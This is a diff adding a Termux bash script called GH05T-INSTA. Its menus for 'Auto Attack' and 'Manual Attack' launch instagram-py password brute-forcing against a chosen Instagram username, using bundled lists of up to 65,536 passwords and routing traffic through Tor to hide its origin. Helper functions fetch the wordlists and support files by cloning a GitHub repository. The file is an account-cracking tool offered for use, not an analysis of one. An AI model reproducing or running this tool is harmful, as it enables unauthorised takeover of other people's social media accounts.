@@ -1,0 +1,543 @@
+#!/bin/bash
+function breakme () {
+if [ -d /data/data/com.termux/files/usr/cookies ]; then
+echo ""
+clear
+else
+clear
+echo " cookies not found"
+echo " please update"
+exit
+fi
+ping -c 1 google.com
+Return="$?"
+if [ "$Return" -eq "0" ]; then
+echo ""
+clear
+else
+clear
+echo ""
+echo " Please On Your Mobile Data"
+sleep 8
+clear
+fi
+}
+function update-info () {
+banners
+sleep 3
+pkg install git -y
+pkg install python -y
+dpkg -s python &> /dev/null # GH05T HUNTER5
+if [ $? -eq 0 ]; then
+echo ""
+clear
+else
+echo ""
+pkg install python 
+clear
+fi
+dpkg -s git &> /dev/null # GH05T HUNTER5
+if [ $? -eq 0 ]; then
+echo ""
+clear
+else
+echo ""
+pkg install git 
+clear
+fi
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd GH05T-INSTA
+python update.py
+exit
+}
+function banners () {
+breakme
+clear
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m | \033[0;32m  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██║  ███╗███████║██║██╔██║███████╗   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ██║   ██║██╔══██║████╔╝██║╚════██║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m | \033[0;32m  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝ \033[1;37m   |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |  \033[0;32m   ██╗███╗   ██╗███████╗████████╗ █████╗  \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██╔██╗ ██║███████╗   ██║   ███████║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║ ╚████║███████║   ██║   ██║  ██║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ \033[1;37m  |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 0.01\033[1;37m|"
+echo -e " \033[1;37m |\033[0;31m Instagram\033[1;37m :\033[0;34m GH05T_HUNTER5   \033[0;31m   FPP    \033[1;37m :\033[0;34m 0.29\033[1;37m|"
+echo -e " \033[1;37m +----------------------------------------------+"
+}
+function cookies-info () {
+echo ""
+clear
+banners
+cat /data/data/com.termux/files/usr/cookies/cookie.txt
+exit
+}
+function error-info () {
+banners
+echo "Wait..."
+sleep 3
+dpkg --configure -a 
+pip install --upgrade pip >/dev/null 2>&1
+pip3 install requests --upgrade >/dev/null 2>&1
+pip3 install requests[socks] >/dev/null 2>&1
+pip3 install stem >/dev/null 2>&1
+pip3 install instagram-py >/dev/null 2>&1
+clear
+}
+if [ $3 = "--pass" ]; then
+echo ""
+if [ $1 = "--user" ]; then
+clear
+if [ $4 = 1 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-1.txt"
+elif [ $4 = 2 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-2.txt"
+elif [ $4 = 3 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-3.txt"
+elif [ $4 = 4 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-4.txt"
+elif [ $4 = 5 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-5.txt"
+else
+clear
+echo " choose password option"
+exit
+fi
+tor > /dev/null 2>&1 &
+clear
+banners
+cd /data/data/com.termux/files/usr/cookies
+php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
+instagram-py --username $2 --password-list $value
+xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+sleep 10
+exit
+else
+echo " Something Wrong"
+exit
+fi
+else
+echo ""
+clear
+fi
+if [ $3 = "--passadd" ]; then
+echo ""
+if [ $1 = "--user" ]; then
+echo ""
+cp -r $4 /data/data/com.termux/files/usr/cookies/
+tor > /dev/null 2>&1 &
+clear
+banners
+cd /data/data/com.termux/files/usr/cookies
+php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
+instagram-py --username $2 --password-list $4
+xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+sleep 10
+exit
+else
+echo " Something Wrong"
+exit
+fi
+else
+echo ""
+clear
+fi
+function help-info () {
+banners
+sleep 3
+echo "
+
+gh05t --user username --pass 1
+{ username  :  Enter your instagram account username }
+{ 1  :  is your Password List Number < 1 = 1059 > < 2 = 65536 number > < 3 = 65536 name > < 4 = 65536 mix > < 5 = 65536 mix > }
+
+gh05t --user username --passadd Your-Pass
+{ Your-Pass  :  Enter Your Password Location and Name also }
+
+gh05t --update
+
+
+
+
+gh05t --error
+
+
+
+
+gh05t developer 
+
+
+
+gh05t --passadd"
+
+echo -e "  \033[1;37m[\033[0;31m99\033[1;37m]\033[0;32m Main                         \033[1;37m[\033[0;31m00\033[1;37m]\033[0;32m Exit"
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Choose an option : \e[0m' options
+}
+
+function check-info () {
+banners
+sleep 3
+if [ -f /data/data/com.termux/files/usr/cookies/password-1.txt ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv password-1.txt data/data/com.termux/files/usr/cookies
+cd $HOME
+rm -rf GH05T-INSTA
+clear
+fi
+if [ -f /data/data/com.termux/files/usr/cookies/password-2.txt ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv password-2.txt data/data/com.termux/files/usr/cookies
+cd $HOME
+rm -rf GH05T-INSTA
+clear
+fi
+if [ -f /data/data/com.termux/files/usr/cookies/password-3.txt ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME 
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv password-3.txt data/data/com.termux/files/usr/cookies
+cd $HOME
+rm -rf GH05T-INSTA
+clear
+fi
+if [ -f /data/data/com.termux/files/usr/cookies/password-4.txt ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME 
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv password-4.txt data/data/com.termux/files/usr/cookies
+cd $HOME
+rm -rf GH05T-INSTA
+clear
+fi
+if [ -f /data/data/com.termux/files/usr/cookies/password-5.txt ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv password-5.txt data/data/com.termux/files/usr/cookies
+cd $HOME
+rm -rf GH05T-INSTA
+clear
+fi
+if [ -f /data/data/com.termux/files/usr/bin/gh05t ]; then
+echo ""
+cd /data/data/com.termux/files/usr/bin
+chmod +x gh05t
+else
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv gh05t /data/data/com.termux/files/usr/bin
+cd $HOME
+rm -rf GH05T-INSTA
+cd /data/data/com.termux/files/usr/bin
+chmod +x gh05t
+clear
+fi
+if [ -f /data/data/com.termux/files/usr/etc/tor/torrc ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv torrc /data/data/com.termux/files/usr/etc/tor
+cd $HOME
+rm -rf GH05T-INSTA
+clear
+fi
+if [ -f /data/data/com.termux/files/usr/cookies/index.html ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv index.html /data/data/com.termux/files/usr/cookies
+cd $HOME
+rm -rf GH05T-INSTA
+fi
+if [ -f /data/data/com.termux/files/usr/cookies/hunter5.css ]; then
+echo ""
+clear
+else
+echo ""
+cd $HOME
+git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA
+cd $HOME/GH05T-INSTA/.gh05t
+mv hunter5.css /data/data/com.termux/files/usr/cookies
+cd $HOME
+rm -rf GH05T-INSTA
+fi
+clear
+exit
+}
+function developer-info () {
+banners 
+sleep 3
+echo -e "  \033[1;37m[\033[0;31m01\033[1;37m]\033[0;32m Telegram                     \033[1;37m[\033[0;31m02\033[1;37m]\033[0;32m Instagram"
+echo -e "  \033[1;37m[\033[0;31m03\033[1;37m]\033[0;32m YouTube                      \033[1;37m[\033[0;31m04\033[1;37m]\033[0;32m Twitter"
+echo -e "  \033[1;37m[\033[0;31m05\033[1;37m]\033[0;32m Blog                         \033[1;37m[\033[0;31m06\033[1;37m]\033[0;32m GitHub"
+echo -e "  \033[1;37m[\033[0;31m99\033[1;37m]\033[0;32m Main                         \033[1;37m[\033[0;31m00\033[1;37m]\033[0;32m Exit"
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Choose an option : \e[0m' options
+if [ $options = "01" ] || [ $options = "1" ]; then
+echo ""
+clear
+xdg-open https://t.me/GH05T_HUNTER5
+clear
+exit
+elif [ $options = "02" ] || [ $options = "2" ]; then
+echo ""
+clear
+xdg-open https://www.instagram.com/gh05t_hunter5/
+clear
+exit
+elif [ $options = "03" ] || [ $options = "3" ]; then
+echo ""
+clear
+xdg-open https://youtube.com/channel/UCLoaCSIy4qzx7X2HCjbD8LA
+elif [ $options = "04" ] || [ $options = "4" ]; then
+echo ""
+clear
+xdg-open https://mobile.twitter.com/gh05_thunter5
+clear
+exit
+elif [ $options = "05" ] || [ $options = "5" ]; then
+echo ""
+clear
+xdg-open https://gh05thunter5.blogspot.com/2022/07/blog-post.html?m=1
+
+elif [ $options = "06" ] || [ $options = "6" ]; then
+echo ""
+clear
+xdg-open https://github.com/GH05T-HUNTER5
+clear
+exit
+elif [ $options = "00" ]; then
+echo ""
+clear
+exit
+elif [ $options = "99" ]; then
+echo ""
+clear
+gh05t
+else
+
+echo ""
+
+fi
+exit
+}
+if [ $1 = "--help" ]; then
+echo ""
+clear
+help-info
+exit
+elif [ $1 = "--update" ]; then
+echo ""
+clear
+update-info
+exit
+elif [ $1 = "--error" ]; then
+echo ""
+clear
+error-info
+exit
+elif [ $1 = "--check" ]; then
+echo ""
+clear
+check-info
+exit
+elif [ $1 = "developer" ]; then
+echo ""
+clear
+developer-info
+exit
+elif [ $1 = "--cookies" ]; then
+echo ""
+clear
+cookies-info
+exit
+else
+echo ""
+clear
+fi
+clear
+function auto-attack () {
+echo ""
+clear
+banners
+echo -e " \033[1;37m | \033[1;37m[\033[0;31m01\033[1;37m]\033[0;32m 1059   Passwords mixed                \033[1;37m  |"
+echo -e " \033[1;37m | \033[1;37m[\033[0;31m02\033[1;37m]\033[0;32m 65536  Passwords numbers              \033[1;37m  |"
+echo -e " \033[1;37m | \033[1;37m[\033[0;31m03\033[1;37m]\033[0;32m 65536  Passwords ABCD                 \033[1;37m  |"
+echo -e " \033[1;37m | \033[1;37m[\033[0;31m04\033[1;37m]\033[0;32m 65536  Passwords Number and ABCD      \033[1;37m  |"
+echo -e " \033[1;37m | \033[1;37m[\033[0;31m05\033[1;37m]\033[0;32m 65536  Passwords Numbers {extra}      \033[1;37m  |"
+echo -e " \033[1;37m +----------------------------------------------+"
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Your Instagram Username : \e[0m' username
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Pssword Type            : \e[0m' passnum
+clear
+if [ $passnum = 1 ] || [ $passnum = 01 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-1.txt"
+elif [ $passnum = 2 ] || [ $passnum = 02 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-2.txt"
+elif [ $passnum = 3 ] || [ $passnum = 03 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-3.txt"
+elif [ $passnum = 4 ] || [ $passnum = 04 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-4.txt"
+elif [ $passnum = 5 ] || [ $passnum = 05 ]; then
+value="/data/data/com.termux/files/usr/cookies/password-5.txt"
+else
+clear
+echo " choose password Type"
+auto-attack
+exit
+fi
+tor > /dev/null 2>&1 &
+clear
+banners
+cd /data/data/com.termux/files/usr/cookies
+php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
+instagram-py --username $username --password-list $value
+xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+sleep 10
+exit
+}
+function Manual-attack () {
+echo ""
+clear
+banners
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Your Instagram Username                : \e[0m' username
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter your password location along with name : \e[0m' passnum
+echo "" 
+cp -r $4 /data/data/com.termux/files/usr/cookies/
+tor > /dev/null 2>&1 &
+clear
+banners
+cd /data/data/com.termux/files/usr/cookies
+php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
+instagram-py --username $username --password-list $passnum
+xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+sleep 10
+exit
+}
+function main-loop () {
+breakme
+clear
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m | \033[0;32m  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝\033[1;37m |"
+echo -e " \033[1;37m |\033[0;32m  ██║  ███╗███████║██║██╔██║███████╗   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ██║   ██║██╔══██║████╔╝██║╚════██║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m |\033[0;32m  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║ \033[1;37m   |"
+echo -e " \033[1;37m | \033[0;32m  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝ \033[1;37m   |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |  \033[0;32m   ██╗███╗   ██╗███████╗████████╗ █████╗  \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██╔██╗ ██║███████╗   ██║   ███████║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║  \033[1;37m |"
+echo -e " \033[1;37m |  \033[0;32m   ██║██║ ╚████║███████║   ██║   ██║  ██║ \033[1;37m  |"
+echo -e " \033[1;37m |  \033[0;32m   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ \033[1;37m  |"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 0.01\033[1;37m|"
+echo -e " \033[1;37m |\033[0;31m Instagram\033[1;37m :\033[0;34m GH05T_HUNTER5   \033[0;31m   FPP    \033[1;37m :\033[0;34m 0.29\033[1;37m|"
+echo -e " \033[1;37m +----------------------------------------------+"
+echo -e "  \033[1;37m[\033[0;31m01\033[1;37m]\033[0;32m Auto Attack"
+echo -e "  \033[1;37m[\033[0;31m02\033[1;37m]\033[0;32m Manual Attack"
+echo -e "  \033[1;37m[\033[0;31m03\033[1;37m]\033[0;32m Update"
+echo -e "  \033[1;37m[\033[0;31m04\033[1;37m]\033[0;32m Error"
+echo -e "  \033[1;37m[\033[0;31m05\033[1;37m]\033[0;32m Developer"
+echo -e "  \033[1;37m[\033[0;31m99\033[1;37m]\033[0;32m Help"
+echo -e "  \033[1;37m[\033[0;31m00\033[1;37m]\033[0;32m Exit"
+read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Choose an option : \e[0m' option
+if [ $option = "01" ] || [ $option = "1" ]; then
+echo ""
+clear
+auto-attack
+clear
+exit
+elif [ $option = "02" ] || [ $option = "2" ]; then
+echo ""
+clear
+Manual-attack
+clear
+exit
+elif [ $option = "03" ] || [ $option = "3" ]; then
+echo ""
+clear
+update-info
+clear
+exit
+elif [ $option = "04" ] || [ $option = "4" ]; then
+echo ""
+clear
+error-info
+clear
+check-info
+clear
+exit
+elif [ $option = "05" ] || [ $option = "5" ]; then
+echo ""
+clear
+developer-info
+clear
+main-loop
+clear
+elif [ $option = "00" ] || [ $option = "0" ]; then
+echo ""
+clear
+exit
+elif [ $option = "99" ]; then
+echo ""
+clear
+help-info
+exit
+else
+echo ""
+clear
+echo " Something Wrong"
+sleep 3
+clear
+main-loop
+exit
+fi
+clear
+main-loop
+}
+main-loop
